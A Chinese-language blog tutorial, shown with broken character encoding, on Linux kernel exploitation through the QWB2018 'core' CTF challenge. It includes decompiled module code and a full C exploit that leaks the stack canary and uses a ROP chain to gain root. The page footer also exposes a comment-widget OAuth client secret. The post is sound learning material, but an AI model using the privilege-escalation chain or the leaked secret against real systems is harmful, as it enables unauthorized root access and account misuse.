class="section">clean:</span></span><br><span class="line">    make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> clean</span><br></pre></td></tr></table></figure>

<ul>
<li><code>obj-m</code>ï¼šæŒ‡å®šäº†ç¼–è¯‘çš„ç»“æœåº”å½“ä¸º <code>.ko</code> æ–‡ä»¶ï¼Œå³å¯è£…è½½å†…æ ¸æ¨¡å—ï¼Œç±»ä¼¼å‘½ä»¤æœ‰ï¼š<code>obj-y</code> ç¼–è¯‘è¿›å†…æ ¸ï¼Œ<code>obj-n</code>Â ä¸ç¼–è¯‘</li>
<li><code>CURRENT_PATH &amp; LINUX_KERNEL &amp; LINUX_KERNEL_PATH</code>ï¼šä¸‰ä¸ªè‡ªå®šä¹‰å˜é‡ï¼Œåˆ†åˆ«æ„å‘³ç€é€šè¿‡ shell å‘½ä»¤è·å¾—å½“å‰è·¯å¾„ã€å†…æ ¸ç‰ˆæœ¬ã€å†…æ ¸æºç è·¯å¾„</li>
<li><code>all</code>ï¼šç¼–è¯‘æŒ‡ä»¤</li>
<li><code>clean</code>ï¼šæ¸…ç†æŒ‡ä»¤</li>
</ul>
<p>ä½¿ç”¨ <code>make</code> å‘½ä»¤å³å¯ç¼–è¯‘ç”Ÿæˆ hello_kernel.ko æ–‡ä»¶</p>
<h3 id="ä½¿ç”¨-LKM"><a href="#ä½¿ç”¨-LKM" class="headerlink" title="ä½¿ç”¨ LKM"></a>ä½¿ç”¨ LKM</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è£…è½½ LKM</span></span><br><span class="line">sudo insmod hello_kernel.ko</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ LKM</span></span><br><span class="line">lkmod | grep hello_kernel</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¸è½½ LKM</span></span><br><span class="line">sudo rmmod hello_kernel.ko</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ LKM è¾“å‡ºä¿¡æ¯</span></span><br><span class="line">dmesg | grep <span class="string">&quot;kenrel module&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="å…¥é—¨é¢˜-qwb2018-core"><a href="#å…¥é—¨é¢˜-qwb2018-core" class="headerlink" title="å…¥é—¨é¢˜ qwb2018_core"></a>å…¥é—¨é¢˜ qwb2018_core</h2><h3 id="æŸ¥çœ‹è„šæœ¬"><a href="#æŸ¥çœ‹è„šæœ¬" class="headerlink" title="æŸ¥çœ‹è„šæœ¬"></a>æŸ¥çœ‹è„šæœ¬</h3><p>çœ‹ä¸€ä¸‹å¯åŠ¨è„šæœ¬ start.sh</p>
<figure class="highlight bash"><figcaption><span>start.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \  </span><br><span class="line">-m 64M \  </span><br><span class="line">-kernel ./bzImage \  </span><br><span class="line">-initrd Â ./core.cpio \  </span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \  </span><br><span class="line">-s Â \  </span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \  </span><br><span class="line">-nographic Â \</span><br></pre></td></tr></table></figure>

<p>å¼€å¯ kaslrï¼Œå¯ä»¥å…ˆå…³é—­ kaslr è·å–æ²¡æœ‰åç§»çš„å‡½æ•°åœ°å€</p>
<p>å†çœ‹ä¸€ä¸‹ init è„šæœ¬</p>
<figure class="highlight bash"><figcaption><span>init</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh  </span></span><br><span class="line">mount -t proc proc /proc  </span><br><span class="line">mount -t sysfs sysfs /sys  </span><br><span class="line">mount -t devtmpfs none /dev  </span><br><span class="line">/sbin/mdev -s  </span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts  </span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts  </span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx  </span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms  </span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict  </span><br><span class="line">ifconfig eth0 up  </span><br><span class="line">udhcpc -i eth0  </span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0  </span><br><span class="line">route add default gw 10.0.2.2 Â   </span><br><span class="line">insmod /core.ko  </span><br><span class="line">Â   </span><br><span class="line">poweroff -d 120 -f &amp;  </span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh  </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span>  </span><br><span class="line">umount /proc  </span><br><span class="line">umount /sys  </span><br><span class="line">Â   </span><br><span class="line">poweroff -d 0 Â -f</span><br></pre></td></tr></table></figure>

<p><del>çœ‹ä¸å¤ªæ‡‚ï¼Œå…ˆæŠŠ poweroff æ³¨é‡Šæ‰å†æ‰“åŒ…å›å»å†è¯´</del></p>
<p>è¿™é‡ŒæŠŠ kallsyms å¤åˆ¶è¿‡å»äº†ï¼Œå¯ä»¥å¾—åˆ°å†…æ ¸å„ä¸ªç¬¦å·çš„åœ°å€</p>
<p>æ³¨æ„è¿™é‡Œçš„è§£åŒ…å’Œæ‰“åŒ…ä¸å¤ªä¸€æ ·ï¼Œå‘ç°è¿˜æœ‰ä¸€å±‚ gzip çš„å‹ç¼©ï¼Œå¡äº†å¥½ä¹… wsfw</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o -H newc | gzip -9 &gt; ../core.cpio</span><br><span class="line"></span><br><span class="line"><span class="comment"># åæ¥å‘ç°è‡ªå¸¦äº†æ‰“åŒ…è„šæœ¬ gen_cpio.sh</span></span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; <span class="variable">$1</span></span><br></pre></td></tr></table></figure>

<h3 id="åˆ†æ-LKM"><a href="#åˆ†æ-LKM" class="headerlink" title="åˆ†æ LKM"></a>åˆ†æ LKM</h3><p>æµ…æµ… checksec ä¸€ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec core.ko</span><br><span class="line">Â Â Â Arch: Â Â Â Â amd64-64-little</span><br><span class="line">Â Â Â RELRO: Â Â Â No RELRO</span><br><span class="line">Â Â Â Stack: Â Â Â Canary found</span><br><span class="line">Â Â Â NX: Â Â Â Â Â Â NX enabled</span><br><span class="line">Â Â Â PIE: Â Â Â Â Â No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>ç„¶åç›´æ¥æ‹–å…¥ IDA å³å¯</p>
<p>å…ˆçœ‹çœ‹ <code>init_module</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">0666LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(&amp;unk_2DE);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºä¸€ä¸ªè¿›ç¨‹èŠ‚ç‚¹æ–‡ä»¶ <code>/proc/core</code>ï¼Œç”¨äºç”¨æˆ·è¿›ç¨‹ä¸ LKM é€šä¿¡</p>
<p>æŸ¥çœ‹ core_fops ç»“æ„ä½“ï¼Œå®šä¹‰äº†ä¸‰ä¸ªå‡½æ•°</p>
<ul>
<li><code>core_write</code>ï¼šè°ƒç”¨ <code>write</code> æ—¶ï¼Œå†…æ ¸è°ƒç”¨æ­¤å‡½æ•°</li>
<li><code>core_ioctl</code>ï¼šè°ƒç”¨ <code>ioctl</code> æ—¶ï¼Œå†…æ ¸è°ƒç”¨æ­¤å‡½æ•°</li>
<li><code>core_release</code>ï¼šåªæœ‰æ‰“å°åŠŸèƒ½ï¼Œè¿˜æ˜¯çœ‹çœ‹ <code>core_write</code> å’Œ <code>core_ioctl</code> å®¶äººä»¬</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 fd, __int64 user, <span class="type">unsigned</span> __int64 size)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, user, size) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)size;</span><br><span class="line">  printk(&amp;unk_230);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>core_write</code> å‘ bss å†™å…¥æœ€å¤š 0x800 å­—èŠ‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 fd, <span class="type">int</span> choice, __int64 value)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( choice )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(value);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = value;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(value);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>core_ioctl</code> å¯è°ƒç”¨ <code>core_read</code>ã€<code>core_copy_func</code> å‡½æ•°ï¼Œä¸”å¯ä»¥è®¾ç½®å…¨å±€å˜é‡ off çš„å€¼</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">core_read</span><span class="params">(__int64 addr_user)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = buf;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(addr_user, &amp;buf[off], <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>core_read</code> å¤åˆ¶æ ˆä¸­ 64 å­—èŠ‚åˆ°ç”¨æˆ·è¿›ç¨‹ç©ºé—´ï¼Œç”±äº off å¯æ§ï¼Œå¯ä»¥ç”¨æ¥æ³„éœ²åœ°å€å’Œ canary</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v2, &amp;name, (<span class="type">unsigned</span> __int16)size);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>core_copy_func</code> ä¼ å…¥ä¸€ä¸ª 64 ä½å¤§å°çš„ sizeï¼Œå¤åˆ¶ bss ä¸Šçš„æ•°æ®åˆ°æ ˆä¸­</p>
<p>size æœ‰æ£€æŸ¥ï¼Œä½†æ˜¯æœ€åå– size çš„ä½ 16 ä½ï¼Œä¼ å…¥ä¸€ä¸ªåˆé€‚è´Ÿæ•°å°±å¯ä»¥æœ€å¤šå¤åˆ¶ 0xffff å­—èŠ‚çš„ bss åˆ°æ ˆä¸­ï¼Œå¯¼è‡´æ ˆæº¢å‡ºï¼Œè¿›è¡Œ ROP</p>
<h3 id="æ¼æ´åˆ©ç”¨-ROP"><a href="#æ¼æ´åˆ©ç”¨-ROP" class="headerlink" title="æ¼æ´åˆ©ç”¨ ROP"></a>æ¼æ´åˆ©ç”¨ ROP</h3><p>æ¼æ´åˆ©ç”¨å·²ç»å¾ˆæ˜äº†</p>
<ul>
<li><code>core_read</code> å¯ä»¥æº¢å‡ºè¯»æ ˆï¼Œæ‹¿åˆ° canary å’ŒåŸºå€<ul>
<li>è¿™é‡Œæä¸€å˜´ï¼Œæ‰çŸ¥é“ canary æ˜¯ä¸€ä¸ªçº¿ç¨‹ä¸€ä¸ªï¼Œä¹‹å‰ä»¥ä¸ºä¸€ä¸ªå‡½æ•°ä¸€ä¸ªï¼Œä¸€ç›´æ²¡æƒ³å‡ºæ¥æ€ä¹ˆåšğŸ˜‡</li>
</ul>
</li>
<li><code>core_copy_func</code> å¯ä»¥æº¢å‡ºå†™æ ˆï¼Œè¿›è¡Œ ROP</li>
</ul>
<p>æ€è·¯</p>
<ol>
<li>è¯»å– kallsyms è·å– <code>prepare_kernel_cred</code> å’Œ <code>commit_creds</code> çš„å‡½æ•°åœ°å€</li>
<li>é€šè¿‡ <code>core_read</code> è·å– canary å’ŒåŸºå€</li>
<li>é€šè¿‡ <code>core_write</code> å†™ ROP é“¾åˆ° bss</li>
<li>é€šè¿‡ <code>core_copy_func</code> å¤åˆ¶ ROP é“¾æ ˆæº¢å‡º</li>
</ol>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><figcaption><span>exp.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../mypwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> iretq 0xffffffff81050ac2 + offset</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> swapgs_popfq_ret 0xffffffff81a012da + offset</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_ret 0xffffffff81000b2f + offset</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mov_rdi_rax_jmp_rdx 0xffffffff8106a6d2 + offset</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdx_ret 0xffffffff810a0f49 + offset</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> swapgs_restore_ret</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mov_cr4_rdi_push_rdx_popfq_ret 0xffffffff81075014 + offset</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ 0x6677889B</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OFF 0x6677889C</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COPY_FUNC 0x6677889A</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(fd, READ, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_set_off_val</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(fd, OFF, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    ioctl(fd, COPY_FUNC, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> addr, offset, canary;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rop_chain[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x300</span>];</span><br><span class="line">    <span class="type">char</span> type[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">    myLog(<span class="string">&quot;Start to pwn kernel&quot;</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get canary &amp; prepare_kernel_cred &amp; commit_creds from kallsyms</span></span><br><span class="line">    get_privilege_addr(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    offset = commit_creds - <span class="number">0xffffffff8109c8e0</span>;</span><br><span class="line">    myLog(<span class="string">&quot;Get offset: %p&quot;</span>, offset);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get canary</span></span><br><span class="line">    core_set_off_val(fd, <span class="number">64</span>);</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    canary = ((<span class="type">unsigned</span> <span class="type">long</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    myLog(<span class="string">&quot;Get canary: %p&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        rop_chain[i] = canary;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// ROP!</span></span><br><span class="line">    rop_chain[i++] = pop_rdi_ret;</span><br><span class="line">    rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[i++] = prepare_kernel_cred;</span><br><span class="line">    rop_chain[i++] = pop_rdx_ret;</span><br><span class="line">    rop_chain[i++] = commit_creds;</span><br><span class="line">    rop_chain[i++] = mov_rdi_rax_jmp_rdx;</span><br><span class="line">    rop_chain[i++] = swapgs_popfq_ret;</span><br><span class="line">    rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[i++] = iretq;</span><br><span class="line">    rop_chain[i++] = get_root_shell;</span><br><span class="line">    rop_chain[i++] = user_cs;</span><br><span class="line">    rop_chain[i++] = user_rflags;</span><br><span class="line">    rop_chain[i++] = user_sp;</span><br><span class="line">    rop_chain[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop_chain, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/02/22/OS-0X01-LINUX-KERNEL-PART-II/">ã€OS.0x01ã€‘Linux Kernel IIï¼šå†…æ ¸ç®€æ˜“é£Ÿç”¨æŒ‡åŒ—</a></p>
<p><a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/">ã€PWN.0x00ã€‘Linux Kernel Pwn Iï¼šBasic Exploit to Kernel Pwn in CTF</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/">https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/</a></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>Kernel Pwn å…¥é—¨</p><p><a href="https://humoooor.cn/2023/08/20/Kernel Pwn å…¥é—¨/">https://humoooor.cn/2023/08/20/Kernel Pwn å…¥é—¨/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>ä½œè€…</h6><p>Humoooor</p></div></div><div class="level-item is-narrow"><div><h6>å‘å¸ƒäº</h6><p>2023-08-20</p></div></div><div class="level-item is-narrow"><div><h6>æ›´æ–°äº</h6><p>2023-10-04</p></div></div><div class="level-item is-narrow"><div><h6>è®¸å¯åè®®</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Linux-Kernel/">Linux Kernel</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2023/09/17/Linux%20Kernel%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Linux Kernel å†…å­˜ç®¡ç†</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2023/06/05/2023.06/"><span class="level-item">2023.06</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">è¯„è®º</h3><div id="comment-container"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script>var gitalk = new Gitalk({
            id: "08ca88c6595c2006daefca6b2e5aa45b",
            repo: "humoooor.github.io",
            owner: "Humoooor",
            clientID: "2262fbb1802e5dc5cc56",
            clientSecret: "55e61f8ed70fa2bcec90cf254ac1864f21cb350b",
            admin: ["Humoooor"],
            createIssueManually: false,
            distractionFreeMode: false,
            perPage: 10,
            pagerDirection: "last",
            
            
